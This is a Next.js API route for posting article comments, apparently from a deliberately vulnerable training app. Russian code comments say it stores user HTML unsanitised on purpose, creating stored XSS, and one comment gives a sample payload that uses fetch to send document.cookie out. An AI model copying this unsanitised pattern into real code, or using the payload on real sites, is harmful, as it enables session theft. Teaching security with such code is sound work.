import { randomUUID } from 'crypto';
import { NextResponse } from 'next/server';

import { db } from '@/lib/db';
import { getCurrentUser } from '@/lib/session';

type Ctx = { params: Promise<{ id: string }> };

// POST ⚠️ Stored XSS: комментарий сохраняется БЕЗ санитизации и позже
// рендерится через dangerouslySetInnerHTML. Payload вида
// <img src=x onerror="fetch('...'+document.cookie)"> крадёт сессию.
export async function POST(req: Request, { params }: Ctx) {
  const user = await getCurrentUser();
  if (!user) {
    return NextResponse.json({ error: 'Не авторизован' }, { status: 401 });
  }

  const { id } = await params;
  const article = db.articles.find((a) => a.id === id);
  if (!article) {
    return NextResponse.json({ error: 'Статья не найдена' }, { status: 404 });
  }

  const body = await req.json().catch(() => ({}));
  const html = typeof body.html === 'string' ? body.html : '';
  if (!html.trim()) {
    return NextResponse.json({ error: 'Пустой комментарий' }, { status: 400 });
  }

  const comment = {
    id: randomUUID(),
    author: user.fio,
    html, // намеренно без экранирования
    createdAt: new Date().toLocaleString('ru-RU'),
  };
  article.comments.push(comment);

  return NextResponse.json({ comment });
}
